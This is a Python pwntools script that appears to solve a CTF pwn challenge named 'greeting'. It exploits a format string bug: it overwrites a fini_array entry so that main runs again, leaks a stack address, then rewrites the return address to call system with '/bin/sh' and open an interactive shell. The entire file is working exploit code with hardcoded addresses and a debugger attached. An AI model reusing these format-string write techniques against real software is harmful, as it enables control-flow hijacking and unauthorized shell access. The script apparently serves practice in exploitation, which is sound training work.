from pwn import *
import time

system_addr = 0x8048779
main_addr = p32(0x080485ed)
strlen_ptr = 0x08049a54
fini_array_ptr = p32(0x08049934)

p = process("./greeting")

gdb.attach(p, "break *0x0804864f\nbreak *0x08048654\nc")
#gdb.attach(p, "c")
# call main a second time
#p.sendline("%218x.%18$hhn" + "BCCCCDDDDEEEE" + fini_array_ptr)

write_fini = "%218x.%17$hhn" + "BCCCCDDDD" + fini_array_ptr + ".%x"

p.sendline(write_fini)

stack_leak = p.recv().split(".")[-1].split(" ")[0]
stack_leak = int(stack_leak, 16)

print "stack leak:" + hex(stack_leak)
ret_addr_loc = stack_leak - 144
bin_sh_loc = stack_leak - 172

write_str = str(bin_sh_loc - 0x08048786 + 8)

print "write_str_len:", len(write_str)
print "write_str:", write_str
# change ret addr to call to system, write bin/sh prt after ret addr
# i got lazy...
p.sendline("%134514534x" + ".%16$nE" + p32(ret_addr_loc) + "%037x" + "%23$hhn" + "bbbbbbbbbbbb" + p32(ret_addr_loc + 4) + "/////bin/sh\x00")

p.recvuntil(":)")
p.interactive()
